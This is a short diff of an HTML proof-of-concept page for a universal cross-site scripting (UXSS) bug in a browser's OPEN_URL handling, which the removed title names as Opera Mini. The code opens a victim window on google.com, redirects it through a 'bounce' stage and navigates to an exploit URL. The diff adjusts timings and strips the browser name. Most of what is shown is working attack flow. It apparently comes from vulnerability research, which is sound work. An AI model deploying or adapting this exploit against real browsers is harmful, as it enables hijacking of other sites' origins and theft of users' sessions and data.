@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Opera Mini OPEN_URL UXSS</title>
+  <title> OPEN_URL UXSS</title>
   <style>
     body { font: 18px/1.5 sans-serif; margin: 2rem; color: #223; }
     button { padding: 1rem 1.4rem; border: 0; border-radius: .6rem;
@@ -23,9 +23,9 @@
       setTimeout(() => {
         location.href = exploit;
         history.back();
-      }, 1000);
+      }, 2000);
     } else {
-      app.innerHTML = '<h1>OPEN_URL  UXSS</h1><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
+      app.innerHTML = '<h1>OPEN_URL UXSS</h1><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
       document.querySelector('#run').onclick = () => {
         const victim = window.open('about:blank', 'openUrlUxssVictim');
         victim.location.replace('https://www.google.com/');
@@ -35,7 +35,7 @@
         bounce.search = '';
         bounce.searchParams.set('stage', 'bounce');
         bounce.searchParams.set('t', String(Date.now()));
-        setTimeout(() => { victim.location.href = bounce.href; }, 5000);
+        setTimeout(() => { victim.location.href = bounce.href; }, 9000);
       };
     }
   </script>
